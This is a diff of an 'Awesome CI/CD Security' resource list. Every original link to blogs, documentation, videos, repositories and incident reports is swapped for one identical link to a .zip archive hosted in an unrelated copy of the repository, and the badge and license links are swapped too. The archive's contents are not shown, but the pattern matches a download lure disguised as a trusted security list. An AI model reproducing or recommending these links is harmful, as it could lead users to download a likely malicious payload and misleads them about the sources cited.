@@ -1,4 +1,4 @@
-# Awesome CI/CD Security [![Awesome](https://awesome.re/badge-flat2.svg)](https://awesome.re)
+# Awesome CI/CD Security [![Awesome](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
 
 List of awesome resources about CI/CD security included books, blogs, videos, tools and cases.
 
@@ -12,78 +12,78 @@ List of awesome resources about CI/CD security included books, blogs, videos, to
 
 ## Book
 
-- [Advanced Infrastructure Penetration Testing](https://www.packtpub.com/product/advanced-infrastructure-penetration-testing/9781788624480)
+- [Advanced Infrastructure Penetration Testing](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
 
 ## Blogs
 
 ### General
 
-- [The Anatomy of an Attack Against a Cloud Supply Pipeline](https://www.paloaltonetworks.com/blog/2021/10/anatomy-ci-cd-pipeline-attack/)
-- [Detecting Malicious Activity in CI/CD Pipeline with Tracee](https://blog.aquasec.com/cicd-pipeline-security-tool-tracee)
-- [Let’s Hack a Pipeline: Argument Injection](https://devblogs.microsoft.com/devops/pipeline-argument-injection/)
-- [Let’s Hack a Pipeline: Stealing Another Repo](https://devblogs.microsoft.com/devops/pipeline-stealing-another-repo/)
-- [Let’s Hack a Pipeline: Shared Infrastructure](https://devblogs.microsoft.com/devops/pipeline-shared-infrastructure/)
-- [Poorly Configured CI/CD Systems Can Be A Backdoor Into Your Infrastructure](https://thenewstack.io/poorly-configured-ci-cd-systems-can-be-a-backdoor-into-your-infrastructure/)
-- [Assess Vulnerabilities and Misconfigurations in CICD Pipelines: Part 1](https://success.qualys.com/discussions/s/article/000005841)
-- [Assess Vulnerabilities and Misconfigurations in CICD Pipelines: Part 2](https://success.qualys.com/discussions/s/article/000005842)
-- [When Supply-Chain Attacks Meet CI/CD Infrastructures](https://blogs.vmware.com/networkvirtualization/2021/12/29260.html/)
-- [Defending software build pipelines from malicious attack](https://www.ncsc.gov.uk/blog-post/defending-software-build-pipelines-from-malicious-attack)
-- [CI/CD Supply Chain Attacks for Data Exfiltration or Cloud Account Takeover](https://www.praetorian.com/blog/ci-cd-supply-chain-attacks-for-data-exfiltration-or-cloud-account-takeover/)
+- [The Anatomy of an Attack Against a Cloud Supply Pipeline](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
+- [Detecting Malicious Activity in CI/CD Pipeline with Tracee](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
+- [Let’s Hack a Pipeline: Argument Injection](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
+- [Let’s Hack a Pipeline: Stealing Another Repo](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
+- [Let’s Hack a Pipeline: Shared Infrastructure](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
+- [Poorly Configured CI/CD Systems Can Be A Backdoor Into Your Infrastructure](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
+- [Assess Vulnerabilities and Misconfigurations in CICD Pipelines: Part 1](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
+- [Assess Vulnerabilities and Misconfigurations in CICD Pipelines: Part 2](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
+- [When Supply-Chain Attacks Meet CI/CD Infrastructures](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
+- [Defending software build pipelines from malicious attack](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
+- [CI/CD Supply Chain Attacks for Data Exfiltration or Cloud Account Takeover](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
 
 ### GitLab
 
-- [Abusing GitLab Runners](https://frichetten.com/blog/abusing-gitlab-runners/)
-- [Securing GitLab CI pipelines with Sysbox](https://blog.nestybox.com/2020/10/21/gitlab-dind.html)
-- [GitLab - Security for self-managed runners](https://docs.gitlab.com/runner/security/)
+- [Abusing GitLab Runners](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
+- [Securing GitLab CI pipelines with Sysbox](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
+- [GitLab - Security for self-managed runners](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
 
 ### GitHub Actions
 
-- [GitHub - Self-hosted runner security](https://docs.github.com/en/actions/hosting-your-own-runners/about-self-hosted-runners#self-hosted-runner-security)
-- [GitHub Action Runners Analyzing the Environment and Security in Action](https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/github-action-runners-analyzing-the-environment-and-security-in-action)
-- [Github Actions Security Best Practices](https://engineering.salesforce.com/github-actions-security-best-practices-b8f9df5c75f5)
-- [Automatically Secure Your CI/CD Pipelines Using Tracee GitHub Action](https://blog.aquasec.com/ci-cd-pipeline-security-tracee-github-action)
+- [GitHub - Self-hosted runner security](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
+- [GitHub Action Runners Analyzing the Environment and Security in Action](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
+- [Github Actions Security Best Practices](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
+- [Automatically Secure Your CI/CD Pipelines Using Tracee GitHub Action](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
 
 ### Jenkins
 
-- [Attacking Jenkins](https://msgpeek.net/blog/2020/02/attacking-jenkins/)
-- [Reflections on trusting plugins: Backdooring Jenkins builds](https://www.synopsys.com/blogs/software-security/backdooring-jenkins-builds-and-security-measures/)
-- [Securing Jenkins](https://www.jenkins.io/doc/book/security/securing-jenkins/)
-- [How to Secure Jenkins Pipelines without the hassle](https://www.contrastsecurity.com/security-influencers/how-to-secure-jenkins-pipelines-without-the-hassle#:~:text=Navigate%20to%20your%20Jenkins%20UI,available%20to%20your%20Jenkins%20instance.)
+- [Attacking Jenkins](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
+- [Reflections on trusting plugins: Backdooring Jenkins builds](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
+- [Securing Jenkins](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
+- [How to Secure Jenkins Pipelines without the hassle](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip~:text=Navigate%20to%20your%20Jenkins%20UI,available%20to%20your%20Jenkins%20instance.)
 
 ### ArgoCD
 
-- [Security Considerations](https://argo-cd.readthedocs.io/en/stable/security_considerations/)
+- [Security Considerations](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
 
 ## Videos
 
-- [Challenges to Securing CI/CD Pipelines](https://www.youtube.com/watch?v=Pd6akunYaZc)
-- [Attacking Development Pipelines For Actual Profit](https://www.youtube.com/watch?v=AQCvfzwcGso)
-- [Exploiting Continuous Integration (CI) and Automated Build systems](https://www.youtube.com/watch?v=mpUDqo7tIk8)
-- [Continuous Intrusion: Why CI Tools Are An Attacker's Best Friends](https://www.youtube.com/watch?v=0H6jd5yG7_A)
-- [How to Build a Compromise Resilient CI/CD](https://www.youtube.com/watch?v=ArS31CxneUA)
-- [Argo CD Security Practices](https://www.youtube.com/watch?v=3IoLH1j6cm0)
+- [Challenges to Securing CI/CD Pipelines](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
+- [Attacking Development Pipelines For Actual Profit](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
+- [Exploiting Continuous Integration (CI) and Automated Build systems](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
+- [Continuous Intrusion: Why CI Tools Are An Attacker's Best Friends](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
+- [How to Build a Compromise Resilient CI/CD](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
+- [Argo CD Security Practices](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
 
 ## Repositories
 
-- [Threat Matrix for CI/CD Pipeline](https://github.com/rung/threat-matrix-cicd)
-- [Jenkins Attack Framework](https://github.com/Accenture/jenkins-attack-framework)
-- [pwn_jenkins](https://github.com/gquere/pwn_jenkins)
+- [Threat Matrix for CI/CD Pipeline](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
+- [Jenkins Attack Framework](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
+- [pwn_jenkins](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
 
 ## Cases
 
-- [10 real-world stories of how we’ve compromised CI/CD pipelines](https://research.nccgroup.com/2022/01/13/10-real-world-stories-of-how-weve-compromised-ci-cd-pipelines/)
-- [Poisoned pipelines: Security researcher explores attack methods in CI environments](https://portswigger.net/daily-swig/poisoned-pipelines-security-researcher-explores-attack-methods-in-ci-environments)
-- [Travis CI Flaw Exposes Secrets of Thousands of Open Source Projects](https://thehackernews.com/2021/09/travis-ci-flaw-exposes-secrets-of.html)
-- [GitHub Actions being actively abused to mine cryptocurrency on GitHub servers](https://www.bleepingcomputer.com/news/security/github-actions-being-actively-abused-to-mine-cryptocurrency-on-github-servers/)
-- [Report: Software supply chain attacks increased 300% in 2021](https://venturebeat.com/2022/01/27/report-software-supply-chain-attacks-increased-300-in-2021/)
-- [Critical vulnerability discovered in popular CI/CD framework](https://www.itpro.co.uk/security/cyber-security/361400/critical-vulnerability-discovered-in-popular-cicd-framework)
-- [Malicious Kubernetes Helm Charts can be used to steal sensitive information from Argo CD deployments](https://apiiro.com/blog/malicious-kubernetes-helm-charts-can-be-used-to-steal-sensitive-information-from-argo-cd-deployments/)
-- [New Attacks on Kubernetes via Misconfigured Argo Workflows](https://www.intezer.com/blog/container-security/new-attacks-on-kubernetes-via-misconfigured-argo-workflows/)
+- [10 real-world stories of how we’ve compromised CI/CD pipelines](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
+- [Poisoned pipelines: Security researcher explores attack methods in CI environments](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
+- [Travis CI Flaw Exposes Secrets of Thousands of Open Source Projects](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
+- [GitHub Actions being actively abused to mine cryptocurrency on GitHub servers](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
+- [Report: Software supply chain attacks increased 300% in 2021](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
+- [Critical vulnerability discovered in popular CI/CD framework](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
+- [Malicious Kubernetes Helm Charts can be used to steal sensitive information from Argo CD deployments](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
+- [New Attacks on Kubernetes via Misconfigured Argo Workflows](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
 
-## [Contributing](contributing.md)
+## [Contributing](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
 
 Your contributions are always welcome.
 
 ## License
 
-[![CC0](https://i.creativecommons.org/p/zero/1.0/88x31.png)](https://creativecommons.org/publicdomain/zero/1.0/)
+[![CC0](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)](https://raw.githubusercontent.com/joymondal/awesome-cicd-security/main/monological/awesome-cicd-security.zip)
